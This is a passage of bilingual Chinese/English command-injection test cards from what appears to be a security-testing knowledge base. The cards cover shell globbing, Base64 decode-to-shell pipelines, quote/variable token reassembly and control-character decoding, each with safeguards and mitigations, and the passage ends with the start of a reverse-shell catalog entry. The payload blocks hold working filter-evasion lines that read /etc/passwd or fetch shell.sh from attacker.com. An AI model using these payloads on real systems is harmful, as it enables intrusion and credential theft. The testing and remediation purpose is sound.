Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归多协议请求拆分
title.en: Remediate and regress Multi-Protocol Request Split

description.zh: 只允许明确的 HTTPS 目标，禁用 file、gopher、ftp、tftp、netdoc 等 scheme，并用网络层出站策略限制后端。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Allow only explicit HTTPS targets, disable file, gopher, ftp, tftp, netdoc, and other schemes, and constrain backend egress at the network layer. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 六行跨文件系统、Redis 和三种网络协议，必须按逐行索引拆分。

prerequisites.zh: 目标为会执行文件名展开的 Unix Shell，并已记录 glob 选项、当前目录和 PATH。
prerequisites.en: The target is a Unix shell that performs filename expansion, with glob options, current directory, and PATH recorded.

prerequisites.zh: 隔离目录内只存在一个可匹配的无害测试程序，避免模式展开到 `/bin` 或 `/usr/bin` 真实命令。
prerequisites.en: An isolated directory contains exactly one matching harmless test program so patterns cannot expand to real commands under `/bin` or `/usr/bin`.

analysis.zh: 阳性要求 Shell 将通配模式展开为测试程序路径并启动它，且无匹配/多匹配对照不执行。WAF 不命中、模式字符串被原样传递、或 Shell 报 No such file 都是假阳性。
analysis.en: Positive evidence requires the shell to expand the glob to the test program and start it, while no-match and multi-match controls do not execute. A silent WAF, literal pattern passing, or a no-such-file error is false positive.

opsecTips.zh: 唯一模式成功展开一次后停止，禁止使用原始 `/bin/ca?` 或下载器模式访问系统文件和网络。
opsecTips.en: Stop after one unique pattern expansion and do not use source `/bin/ca?` or downloader patterns against system files or the network.

opsecTips.zh: 删除测试程序和隔离目录，恢复 PATH/glob 设置并确认没有下载文件或后台子进程。
opsecTips.en: Delete the test program and isolated directory, restore PATH and glob settings, and verify that no downloads or background processes remain.

name.zh: Shell 通配符命令名绕过

description.zh: 利用 ?, 字符类和星号让 Shell 在文件系统展开可执行路径，验证命令关键词过滤是否被通配符绕过。
description.en: Uses ?, character classes, and * so the shell expands executable paths, testing whether command-name filtering is bypassed by globbing.

overview.zh: Shell 通配符命令名绕过用于载荷依赖 Unix 文件系统存在唯一匹配路径和 Shell 文件名展开；匹配多个文件时行为可能不同，必须先在同构环境确认。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Shell Glob Command-Name Bypass is intended for this boundary: The payload depends on Unix filesystem paths and shell filename expansion; multiple matches may change behavior, so verify in an equivalent environment first. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 过滤器检查原始命令名，而 Shell 在过滤后将通配模式展开成真实可执行路径，恢复被阻止的命令。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A filter inspects the raw command name while the shell expands a glob into the real executable path afterward, restoring the blocked command. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 用隔离目录中的无害测试可执行文件建立唯一匹配，比较完整路径、通配模式和无匹配负对照，不访问系统文件。 Shell 跟踪和进程映像必须显示通配模式展开为测试程序；No such file、多个匹配或 WAF 放行都不是成功。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Create a uniquely matching harmless test executable in an isolated directory and compare full path, glob pattern, and no-match control without accessing system files. Shell tracing and the process image must show the pattern expanding to the test program; no-match errors, multiple matches, or WAF passage are insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 不用 Shell 解析用户输入，以固定可执行路径和 argv 调用；若必须处理路径，关闭 glob 并对规范路径允许列表校验。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Do not let a shell parse user input; invoke a fixed executable with argv, and if paths are required, disable globbing and allowlist canonical paths. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认文件名展开命令注入适用边界
title.en: Confirm the Filename-Expansion Command Injection boundary

description.zh: 载荷依赖 Unix 文件系统存在唯一匹配路径和 Shell 文件名展开；匹配多个文件时行为可能不同，必须先在同构环境确认。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The payload depends on Unix filesystem paths and shell filename expansion; multiple matches may change behavior, so verify in an equivalent environment first. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控文件名展开命令注入样例
title.en: Submit a controlled Filename-Expansion Command Injection case

description.zh: 用隔离目录中的无害测试可执行文件建立唯一匹配，比较完整路径、通配模式和无匹配负对照，不访问系统文件。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Create a uniquely matching harmless test executable in an isolated directory and compare full path, glob pattern, and no-match control without accessing system files. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对文件名展开命令注入证据
title.en: Verify Filename-Expansion Command Injection evidence

description.zh: Shell 跟踪和进程映像必须显示通配模式展开为测试程序；No such file、多个匹配或 WAF 放行都不是成功。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Shell tracing and the process image must show the pattern expanding to the test program; no-match errors, multiple matches, or WAF passage are insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归文件名展开命令注入
title.en: Remediate and regress Filename-Expansion Command Injection

description.zh: 不用 Shell 解析用户输入，以固定可执行路径和 argv 调用；若必须处理路径，关闭 glob 并对规范路径允许列表校验。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Do not let a shell parse user input; invoke a fixed executable with argv, and if paths are required, disable globbing and allowlist canonical paths. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 通配符在 Shell 中重建命令路径，是实际命令注入 Payload。

prerequisites.zh: 目标命令链确实包含 Base64 解码器与 sh/bash 管道，而不是仅做数据解码或存储。
prerequisites.en: The target chain includes a Base64 decoder piped to sh or bash rather than only decoding or storing data.

prerequisites.zh: 准备编码后的固定无害令牌，并能区分解码器进程与随后启动的 Shell。
prerequisites.en: Prepare an encoded harmless fixed token and distinguish the decoder process from the shell it launches.

analysis.zh: 阳性是解码输出进入指定 Shell 并由该 Shell 产生令牌，且只解码对照不执行。解码正确、管道创建但 Shell 未读取、或响应中出现 `/etc/passwd` 字样均是假阳性。
analysis.en: Positive evidence is decoded output entering the designated shell and that shell producing the token while a decode-only control does not execute. Correct decoding, a pipe without shell consumption, or `/etc/passwd` text in a response is false positive.

opsecTips.zh: 一次受控令牌执行后停止，不运行原始读取命令，也不尝试交互 Shell 或下载脚本。
opsecTips.en: Stop after one controlled token execution; do not run the source read command or attempt an interactive shell or script download.

opsecTips.zh: 终止测试管道，清理 Shell 历史、解码临时文件和缓存，并复核没有子 Shell 存活。
opsecTips.en: Terminate the test pipeline, clear shell history, decoder temporary files, and caches, and verify no child shell remains alive.

name.zh: Base64 解码后管道执行

description.zh: 把 Base64 明文通过管道送入 sh/bash 或命令替换，验证编码检查与执行阶段之间的二次解释。
description.en: Pipes Base64-decoded text into sh or bash, or uses command substitution, to test second-stage interpretation between filtering and execution.

overview.zh: Base64 解码后管道执行用于与普通 Base64 解码不同，本条明确将结果送入 Shell；管道执行与命令替换的进程树和风险需要分别观察。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Base64 Decode-to-Shell Pipeline Injection is intended for this boundary: Unlike decode-only behavior, this entry explicitly feeds output to a shell; pipeline execution and command substitution have distinct process trees. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 防护在编码文本层判断，而后端先解码再启动 Shell 解析明文，导致危险语法在安全检查之后出现。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A control evaluates encoded text while the backend decodes and launches a shell, causing dangerous syntax to appear after inspection. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 把编码内容替换为只输出唯一令牌的 echo，分别测试 sh 管道、bash 管道和命令替换，并保留只解码负对照。 进程审计必须显示解码器子进程之后启动对应 Shell 且令牌由其输出；解码成功但未执行不算。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Replace content with an encoded echo of a unique token and compare sh pipeline, bash pipeline, command substitution, and a decode-only negative control. Process auditing must show the designated shell after the decoder and the token emitted by it; successful decoding without execution is not a finding. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 永不执行用户可控解码结果，移除 shell 管道并在解码后进行数据 Schema 校验；以固定函数完成业务动作。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Never execute user-controlled decoded output, remove shell pipelines, validate a data schema after decoding, and map business actions to fixed functions. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认解码到 Shell 管道适用边界
title.en: Confirm the Decode-to-Shell Pipeline boundary

description.zh: 与普通 Base64 解码不同，本条明确将结果送入 Shell；管道执行与命令替换的进程树和风险需要分别观察。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Unlike decode-only behavior, this entry explicitly feeds output to a shell; pipeline execution and command substitution have distinct process trees. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控解码到 Shell 管道样例
title.en: Submit a controlled Decode-to-Shell Pipeline case

description.zh: 把编码内容替换为只输出唯一令牌的 echo，分别测试 sh 管道、bash 管道和命令替换，并保留只解码负对照。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Replace content with an encoded echo of a unique token and compare sh pipeline, bash pipeline, command substitution, and a decode-only negative control. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | /bin/bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | /bin/sh
$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)
`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`

title.zh: 核对解码到 Shell 管道证据
title.en: Verify Decode-to-Shell Pipeline evidence

description.zh: 进程审计必须显示解码器子进程之后启动对应 Shell 且令牌由其输出；解码成功但未执行不算。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Process auditing must show the designated shell after the decoder and the token emitted by it; successful decoding without execution is not a finding. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归解码到 Shell 管道
title.en: Remediate and regress Decode-to-Shell Pipeline

description.zh: 永不执行用户可控解码结果，移除 shell 管道并在解码后进行数据 Schema 校验；以固定函数完成业务动作。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Never execute user-controlled decoded output, remove shell pipelines, validate a data schema after decoding, and map business actions to fixed functions. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 该记录是明确的解码到 Shell 注入链，而非 Base64 工具教程。

prerequisites.zh: 确认目标 Shell 对未定义变量、反斜杠和空引号的处理规则，并记录 nounset 等选项。
prerequisites.en: Confirm how the target shell handles undefined variables, backslashes, and empty quotes, including options such as nounset.

prerequisites.zh: 在隔离 PATH 中配置一个名称可被重组的无害程序，且不存在同名系统命令。
prerequisites.en: Configure a harmless reassemblable program in an isolated PATH with no same-named system command.

analysis.zh: 阳性是空变量/引号/转义经词法处理后形成测试程序的单一 argv[0]。未定义变量报错、字符串仅在日志中拼接、或下载 URL 被解析但未启动命令都属于假阳性。
analysis.en: Positive evidence is lexical processing of empty variables, quotes, or escapes into one argv[0] for the test program. Undefined-variable errors, log-only concatenation, or a parsed download URL without command execution are false positives.

opsecTips.zh: 验证三类机制中任一最小样例后停止，不继续尝试 wget/curl 原始行或外部下载。
opsecTips.en: Stop after one minimal case from any mechanism and do not continue to the source wget or curl lines or external downloads.

opsecTips.zh: 恢复环境变量和 PATH，删除测试程序，并检查没有空变量配置、下载文件或审计噪声残留。
opsecTips.en: Restore environment variables and PATH, delete the test program, and check that no empty-variable settings, downloads, or audit noise remain.

name.zh: Shell 变量与空引号令牌重组
name.en: Shell Variable and Empty-Quote Token Reassembly

description.zh: 利用未定义变量、反斜杠与空引号把被拆开的命令名在 Shell 中重新组合，测试关键词防护。
description.en: Uses undefined variables, backslashes, and empty quotes to reassemble fragmented command names in the shell and test keyword controls.

overview.zh: Shell 变量与空引号令牌重组用于样例涵盖参数展开、转义和空引号拼接三种 Shell 词法行为，必须按实际 Shell 逐类验证而非混为一种规则。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Shell Variable and Empty-Quote Token Reassembly is intended for this boundary: Samples cover parameter expansion, escaping, and empty-quote concatenation and must be validated separately for the actual shell. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 过滤器只匹配原始连续关键字，Shell 随后删除空展开、转义符和引用边界，使片段恢复为同一命令名。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A filter matches only contiguous raw keywords while the shell removes empty expansions, escapes, and quote boundaries and restores one command token. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 在隔离目录使用无害命令别名，分别提交未定义变量、反斜杠和空引号形式，并用已定义非空变量作负对照。 Shell xtrace 或进程路径需显示片段最终形成预期无害程序；仅输入被接受或下载地址出现在日志中不成立。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Use a harmless command alias in isolation, test undefined-variable, backslash, and empty-quote forms separately, and use a defined nonempty variable as a control. Shell xtrace or process path must show fragments forming the intended harmless program; accepted input or a URL in logs is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 使用无 Shell 的参数数组调用，清理不需要的环境变量并允许列表化可执行动作；禁止依赖字符串关键词阻断。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Use shell-free argument arrays, clear unneeded environment variables, allowlist executable actions, and do not rely on keyword blocking. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认变量展开令牌重组适用边界
title.en: Confirm the Variable-Expansion Token Reassembly boundary

description.zh: 样例涵盖参数展开、转义和空引号拼接三种 Shell 词法行为，必须按实际 Shell 逐类验证而非混为一种规则。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Samples cover parameter expansion, escaping, and empty-quote concatenation and must be validated separately for the actual shell. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控变量展开令牌重组样例
title.en: Submit a controlled Variable-Expansion Token Reassembly case

description.zh: 在隔离目录使用无害命令别名，分别提交未定义变量、反斜杠和空引号形式，并用已定义非空变量作负对照。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Use a harmless command alias in isolation, test undefined-variable, backslash, and empty-quote forms separately, and use a defined nonempty variable as a control. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
c${undefined}at /etc/passwd
c${DOESNOTEXIST}at /etc/passwd
c\a\t /etc/passwd
c''at /etc/passwd
c""at /etc/passwd
w''get http://attacker.com/shell.sh
c''u''r''l http://attacker.com/shell.sh

title.zh: 核对变量展开令牌重组证据
title.en: Verify Variable-Expansion Token Reassembly evidence

description.zh: Shell xtrace 或进程路径需显示片段最终形成预期无害程序；仅输入被接受或下载地址出现在日志中不成立。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Shell xtrace or process path must show fragments forming the intended harmless program; accepted input or a URL in logs is insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归变量展开令牌重组
title.en: Remediate and regress Variable-Expansion Token Reassembly

description.zh: 使用无 Shell 的参数数组调用，清理不需要的环境变量并允许列表化可执行动作；禁止依赖字符串关键词阻断。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Use shell-free argument arrays, clear unneeded environment variables, allowlist executable actions, and do not rely on keyword blocking. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 变量和引用重组改变 Shell 令牌，是命令注入 Payload。

prerequisites.zh: 已绘制代理、框架和 Shell 的 URL 解码顺序，明确 `%0a`、`%0d` 与 `%09` 在哪一层变为控制字节。
prerequisites.en: Map decoding across proxy, framework, and shell and identify where `%0a`, `%0d`, and `%09` become control bytes.

prerequisites.zh: 能捕获原始请求、应用参数和最终 argv，且后续动作只输出固定标记。
prerequisites.en: Capture raw requests, application parameters, and final argv, with the follow-on action limited to a fixed marker.

analysis.zh: 阳性需证明控制字节在应用解码后形成新的命令或参数边界并产生标记。HTML 换行、日志注入、代理拆请求、或 400/500 错误变化都是假阳性。
analysis.en: Positive evidence proves that a decoded control byte creates a new command or argument boundary and produces the marker. HTML line breaks, log injection, proxy request splitting, or changed 400 or 500 errors are false positives.

opsecTips.zh: 首次确认一个 CR/LF/Tab 边界后停止，禁止继续用读取文件的原始后缀扩大影响。
opsecTips.en: Stop after confirming one CR, LF, or Tab boundary and do not extend impact with the source file-read suffixes.

opsecTips.zh: 清除代理和应用中的测试请求副本，转义日志控制字符，并确认没有拆分请求或重试任务遗留。
opsecTips.en: Remove test-request copies from proxy and application state, escape controls in logs, and verify no split request or retry job remains.

name.zh: 控制字符解码命令注入

description.zh: 使用百分号编码换行、回车和制表符改变命令名或参数边界，验证解码层与 Shell 解析差异。
description.en: Uses percent-encoded newline, carriage return, and tab characters to alter command names or argument boundaries and test decoder/shell differences.

overview.zh: 控制字符解码命令注入用于这些字符串同时测试 URL 解码是否发生以及 Shell 是否把控制字符当作分隔符；两层结果必须分别记录。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Control-Character Decoding Command Injection is intended for this boundary: These strings test both URL decoding and whether the shell treats controls as separators, so each layer's result must be recorded separately. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 网关按编码文本校验，应用解码后把 CR、LF 或 Tab 交给 Shell，控制字节在防护之后成为空白或命令边界。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A gateway validates encoded text while the application decodes CR, LF, or Tab before shell use, turning bytes into whitespace or command boundaries after inspection. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 使用固定 echo 标记，分别测试原始控制字节、单层编码和双重编码，并捕获网关、应用参数与进程 argv。 最终 argv 或 Shell 审计必须显示控制字节形成独立命令或参数，并对应固定标记；换行页面和日志污染需排除。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Use a fixed echo marker and compare raw controls, single encoding, and double encoding while capturing gateway values, application parameters, and process argv. Final argv or shell audit must show a control byte creating a separate command or argument with the fixed marker, excluding page formatting and log injection. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 在边界只解码一次，拒绝控制字符和非规范编码，并以固定程序 argv 调用；日志单独转义 CR/LF。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Decode once at the boundary, reject controls and non-canonical encoding, invoke a fixed program with argv, and escape CR/LF separately in logs. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认CR/LF/Tab 解码绕过适用边界
title.en: Confirm the CR/LF/Tab Decoding Bypass boundary

description.zh: 这些字符串同时测试 URL 解码是否发生以及 Shell 是否把控制字符当作分隔符；两层结果必须分别记录。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: These strings test both URL decoding and whether the shell treats controls as separators, so each layer's result must be recorded separately. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控CR/LF/Tab 解码绕过样例
title.en: Submit a controlled CR/LF/Tab Decoding Bypass case

description.zh: 使用固定 echo 标记，分别测试原始控制字节、单层编码和双重编码，并捕获网关、应用参数与进程 argv。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Use a fixed echo marker and compare raw controls, single encoding, and double encoding while capturing gateway values, application parameters, and process argv. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对CR/LF/Tab 解码绕过证据
title.en: Verify CR/LF/Tab Decoding Bypass evidence

description.zh: 最终 argv 或 Shell 审计必须显示控制字节形成独立命令或参数，并对应固定标记；换行页面和日志污染需排除。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Final argv or shell audit must show a control byte creating a separate command or argument with the fixed marker, excluding page formatting and log injection. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归CR/LF/Tab 解码绕过
title.en: Remediate and regress CR/LF/Tab Decoding Bypass

description.zh: 在边界只解码一次，拒绝控制字符和非规范编码，并以固定程序 argv 调用；日志单独转义 CR/LF。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Decode once at the boundary, reject controls and non-canonical encoding, invoke a fixed program with argv, and escape CR/LF separately in logs. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 控制字符经解码后改变 Shell 语法，属于命令注入 Payload。

prerequisites.zh: 已确定入口闭合方式和目标 Shell，能够分别测试分隔符、命令替换、IFS 与大括号扩展。
prerequisites.en: Determine the entry closure and target shell and be able to test separators, command substitution, IFS, and brace expansion separately.

prerequisites.zh: 所有原始敏感命令均替换成无副作用令牌生成器，并启用请求到进程树关联。
prerequisites.en: Replace every sensitive source command with a side-effect-free token generator and enable request-to-process-tree correlation.

analysis.zh: 阳性是某一明确 Shell 展开阶段创建标记子进程，且同闭合的阴性对照不执行。文件内容出现在缓存、WAF 规则命中、或 `{cat,...}` 被当普通字符串都不能证明注入。
analysis.en: Positive evidence is a marker child process created at a specific shell expansion stage while a same-closure negative control does not execute. Cached file content, a WAF match, or `{cat,...}` treated literally does not prove injection.

opsecTips.zh: 每种展开类别最多取得一个阳性即停止，不串联多个机制或执行最后一行的交互 Bash 管道。
opsecTips.en: Stop after at most one positive per expansion category and do not chain mechanisms or run the final interactive Bash pipeline.

opsecTips.zh: 终止所有标记子进程，删除测试输出和命令历史，并复核没有 FIFO、Shell 或下载产物。
opsecTips.en: Terminate all marker child processes, delete test output and command history, and verify that no FIFO, shell, or downloaded artifact remains.

name.zh: Shell 分隔、替换与大括号扩展注入
name.en: Shell Separator, Substitution, and Brace-Expansion Injection

description.zh: 覆盖命令连接符、命令替换、IFS 和大括号扩展形成的完整命令注入表达式。
description.en: Covers command connectors, command substitution, IFS, and brace expansion in complete command-injection expressions.

subCategory.zh: 复合 Shell 语法注入

overview.zh: Shell 分隔、替换与大括号扩展注入用于与基础边界卡相比，本条包含带命令体的完整表达式和多种展开阶段，应逐机制测试而不是整块提交。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Shell Separator, Substitution, and Brace-Expansion Injection is intended for this boundary: Unlike the basic boundary card, this entry contains complete expressions across expansion stages and should be tested one mechanism at a time. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 输入进入 Shell 后会经历词法、参数、命令和大括号展开，单一分隔符黑名单无法覆盖全部等价语法。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: Once input enters a shell it undergoes lexical, parameter, command, and brace expansion, which a single separator blacklist cannot cover. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 将敏感命令替换为固定标记生成器，按分隔符、命令替换、IFS 和大括号四组逐个测试，并保持入口闭合一致。 进程树必须显示标记命令由受测请求派生，且阴性对照不执行；文件内容、通用错误或页面回显不能替代。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Replace sensitive commands with a fixed marker generator and test separators, command substitution, IFS, and braces as four separate groups with identical closure. The process tree must show the marker command derived from the request while the negative control does not execute; file content, generic errors, or reflection are insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 移除动态 Shell 字符串，使用固定可执行文件和参数数组；对业务动作建立显式映射，并限制子进程权限和出站网络。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Remove dynamic shell strings, use fixed executables and argument arrays, map business actions explicitly, and restrict child-process privileges and egress. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认复合 Shell 语法注入适用边界
title.en: Confirm the Composite Shell-Syntax Injection boundary

description.zh: 与基础边界卡相比，本条包含带命令体的完整表达式和多种展开阶段，应逐机制测试而不是整块提交。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Unlike the basic boundary card, this entry contains complete expressions across expansion stages and should be tested one mechanism at a time. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控复合 Shell 语法注入样例
title.en: Submit a controlled Composite Shell-Syntax Injection case

description.zh: 将敏感命令替换为固定标记生成器，按分隔符、命令替换、IFS 和大括号四组逐个测试，并保持入口闭合一致。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Replace sensitive commands with a fixed marker generator and test separators, command substitution, IFS, and braces as four separate groups with identical closure. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对复合 Shell 语法注入证据
title.en: Verify Composite Shell-Syntax Injection evidence

description.zh: 进程树必须显示标记命令由受测请求派生，且阴性对照不执行；文件内容、通用错误或页面回显不能替代。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: The process tree must show the marker command derived from the request while the negative control does not execute; file content, generic errors, or reflection are insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归复合 Shell 语法注入
title.en: Remediate and regress Composite Shell-Syntax Injection

description.zh: 移除动态 Shell 字符串，使用固定可执行文件和参数数组；对业务动作建立显式映射，并限制子进程权限和出站网络。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Remove dynamic shell strings, use fixed executables and argument arrays, map business actions explicitly, and restrict child-process privileges and egress. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 完整表达式仍是命令注入载荷，不应迁到 Linux 命令工具卡。

prerequisites.zh: 已确认 10 行均为获得执行权限后直接运行的完整回连 CLI，不含请求参数闭合或漏洞触发语法。
prerequisites.en: Confirm that all ten lines are complete callback CLI commands run after execution is obtained and contain no request closure or vulnerability-trigger syntax.

prerequisites.zh: 六个目标工具卡存在，且按 Bash、Python、Perl、PHP、Ruby、Netcat 的逐行索引路由已校验。
prerequisites.en: The six destination tool cards exist and line-index routing for Bash, Python, Perl, PHP, Ruby, and Netcat has been validated.

analysis.zh: 迁移阳性证据是每行具有独立解释器/可执行文件和 ATTACKER_IP/4444 运行参数，属于操作命令而非入口 Payload。回连成功只证明已有代码执行与出站网络，不能反向证明命令注入来源；这也是迁 Tool 的边界。
analysis.en: Migration evidence is that every line names an independent interpreter or executable with ATTACKER_IP and port 4444 runtime parameters, making it an operational command rather than an entry payload. A callback proves existing execution and egress, not the source of command injection, which defines the tool boundary.

opsecTips.zh: 内容迁移阶段不建立真实回连；若必须做工具冒烟，只允许隔离回环监听，连接一次即停止。
opsecTips.en: Do not establish a real callback during migration; if a tool smoke test is required, permit only an isolated loopback listener and stop after one connection.

opsecTips.zh: 关闭监听器，删除 `/tmp/f` FIFO 和任何临时脚本，清理工具卡重复行并移除原 Payload 导航。
opsecTips.en: Close listeners, delete `/tmp/f` FIFO and temporary scripts, deduplicate tool-card lines, and remove the source payload navigation entry.

name.zh: 多语言反向 Shell 命令参考

description.zh: 汇总 Bash、Python、Perl、PHP、Ruby 与 Netcat 的独立反向连接命令，属于工具命令参考而非注入入口载荷。
description.en: Catalogs standalone reverse-connection commands for Bash, Python, Perl, PHP, Ruby, and Netcat and is a tool reference rather than injection-boundary input.

subCategory.zh: 反向 Shell 命令目录

overview.zh: 多语言反向 Shell 命令参考用于10 行都是获得执行能力之后运行的完整 CLI，缺少参数闭合、请求位置或解释器逃逸条件，不能作为独立 RCE 证明。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
